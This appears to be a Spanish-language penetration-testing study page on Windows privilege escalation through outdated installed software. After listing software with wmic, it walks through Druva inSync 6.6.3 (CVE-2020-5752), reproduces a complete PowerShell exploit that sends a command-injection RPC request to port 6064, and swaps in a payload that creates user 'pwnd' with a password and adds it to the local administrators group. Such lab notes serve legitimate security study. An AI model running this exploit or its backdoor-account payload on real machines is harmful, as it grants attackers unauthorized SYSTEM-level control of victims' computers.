# Abusing Vulnerable Software

### Unpatched Software

El software instalado en el sistema de la victima puede presentar varias oportunidades de escalada de privilegios. Al igual que ocurre con los drivers, es posible que las empresas y los usuarios no los actualicen con la misma frecuencia, con la que actualizan el sistema operativo. Se puede utilizar la herramienta `wmic` para listar el software instalado y sus versiones: `wmic product get name,version,vendor`

> El comando wmic product puede no devolver todos los programas instalados

Cuando veamos todos los programas que tienen instalados y versiones, podemos ir mirano en exploit-db para ver si existen exploits

### Ejemplo Practico : Druva inSync 6.6.3

La victima ejecuta Druva inSync 6.6.3, que es vulnerable a una escalada de privilegios Para montar un exploit que funcione, necesitamos entender cómo hablar con el puerto 6064 -> El software es vulnerable porque ejecuta un servidor RPC (Remote Procedure Call) en el puerto 6064 con privilegios SYSTEM

<figure><img src="../../.gitbook/assets/Pasted image 20250127164431.png" alt=""><figcaption></figcaption></figure>

&#x20;El primer paquete, es hola (contiene una cadena fija) El segundo que queremos hacer un procedimiento numero 5 (vulnerable que ejecutará cualquier comando por nosotros) Los dos últimos paquetes, enviaran la longitud del comando y la cadena del comando a ejecutar

> Se puede descargar y ejecutar el exploit de Matteo Malvica

```powershell
# Exploit Title: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)
# Date: 2020-12-03
# Exploit Author: 1F98D
# Original Author: Matteo Malvica
# Vendor Homepage: druva.com
# Software Link: https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi
# Version: 6.6.3
# Tested on: Windows 10 (x64)
# CVE: CVE-2020-5752
# References: https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/
# Druva inSync exposes an RPC service which is vulnerable to a command injection attack.

$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Ahora, puedo abrir un `powershell` y ejecutarlo directamente

> Ten en cuenta que el payload por defecto del exploit, especificado en la variable $cmd, creará un usuario llamado pwnd en el sistema, pero no le asignará privilegios de adminsitrador, por lo que probablemente querremos cambiar el payload por algo más útil

Asi que hay que hay que modificar el exploit, añadir esta linea en su variable `$cmd` `net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add`

<figure><img src="../../.gitbook/assets/Pasted image 20250127170207.png" alt=""><figcaption></figcaption></figure>

&#x20;Y ahora ya podemos ejecutar la cmd como Administrator y utilizamos la cuenta de pwnd&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20250127170507.png" alt=""><figcaption></figcaption></figure>
